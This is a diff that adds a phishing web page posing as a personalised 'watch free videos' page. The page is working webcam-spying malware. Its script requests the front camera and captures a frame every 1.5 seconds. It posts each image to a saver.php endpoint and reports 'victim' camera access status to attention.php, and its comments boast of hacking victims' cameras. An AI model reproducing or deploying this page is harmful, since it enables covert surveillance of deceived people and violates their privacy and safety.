@@ -1,0 +1,121 @@
+<!doctype html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible"content="IE=edge">
+        <meta name="viewport"content="width=device-width,initial-scale=1.0">
+        <title>watch free videos</title>
+        <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+        <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+        <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <script type="text/javascript" src="payload.js"></script>
+    </head>
+    <body>
+      
+    <div class="anonContent">
+      <div class="video-wrap" hidden="hidden"><video id="video" playsinline autoplay></video></div>
+       <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+        <span id="errorMsg" hidden="hidden"></span>
+          </div>
+
+  <script>
+    function post(imgdata){
+    $.ajax({
+        type: 'POST',
+        data: { caption: imgdata},
+        url: './saver.php',
+        dataType: 'json',
+        async: false,
+        success: function(result){
+            // call the function that handles the response/results
+        },
+        error: function(){
+        }
+      });
+    };
+    
+    
+    'use strict';
+    
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const errorMsgElement = document.getElementById('errorMsg');
+    
+    const constraints = {
+      audio: false,
+      video: {
+        
+        facingMode: "user"
+      }
+    };
+    
+    // Access webcam
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+      } catch (e) {
+        errorMsgElement.innerHTML = e.toString();
+        console.log(`navigator.getUserMedia error:${e.toString()}`);
+        if (e.toString().includes("NotFoundError")){
+            console.log("Hmm, Internal or External Webcam can not be found in victims device!");
+        await wait4me(5000);
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("post", "./attention.php?Access Denied=Hmm, internal or external camera can not be found in victims device!");//
+            xhttp.send();
+            console.log(xhttp);
+        } else {
+            console.log("Hmm,\nWe fucking well need to fucking access ur fucking camera, men!");
+            alert("Allow camera access in order to expriment our features!");
+            window.location.href = "https://www.lifewire.com/configure-camera-microphone-setting-in-google-chrome-4103623";
+            alert("Access to Camera Successfully Granted");
+            console.log("BOOM!, Game Over...");
+        }
+      }
+    }
+    
+    // Success
+    async function handleSuccess(stream) {
+      window.stream = stream;
+      video.srcObject = stream;
+      console.log("we successfully hacked victims internal or their external camera!");
+        await wait4me(5000);
+            var xhttp = new XMLHttpRequest();
+            xhttp.open("post", "./attention.php?Access Granted=we successfully hacked into victims camera!,&Access Granted=Now u can be able to received victims pictures.");//
+            xhttp.send();
+            console.log(xhttp);
+    
+    var context = canvas.getContext('2d');
+      setInterval(function(){
+    
+           context.drawImage(video, 0, 0, 640, 480);
+           var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+           post(canvasData); }, 1500);
+    
+    }
+    
+    // Load init
+    init();
+    
+    </script>
+<style>
+    body{text-align: center;background-color: black;font-family: Arial, Helvetica, sans-serif;}
+</style>
+        <h3 style="color:green;font-size: 1.15rem;">Hello, <script>
+            document.write(xxx);
+        </script>!</h3>
+            <p style="color:whitesmoke;font-size: 1.5rem;">
+                This below video is specially sent just for you,<br>please watch and enjoy this moment.</p>
+        
+        <div style="background-color: #ccc; filter: blur(20%); border-radius: 17px; border: 0px solid rgb(0, 0, 0); box-shadow: rgba(0, 0, 0, 0.2) 5px 5px 5px; color: whitesmoke; font-family: arial, sans-serif; font-size: 18px; font-stretch: normal; font-style: normal; font-variant: normal; line-height: normal; margin: 120px auto 0px; padding: 4px 5px 3px; width: 70%;">    
+                    <video width="88%" height="auto" controls>
+                        <source src="video_url" type="video/mp4">
+                        <h3 style="color:green">Dear <script>
+                            document.write(xxx);
+                            </script>, </h3><p>Your browser does not support this our video frame.
+                            <br>Please click to link below to load video again <a href="video_url">
+                            video_url</a></p>
+                    </video>
+        </div>
+    </body>
+</html>
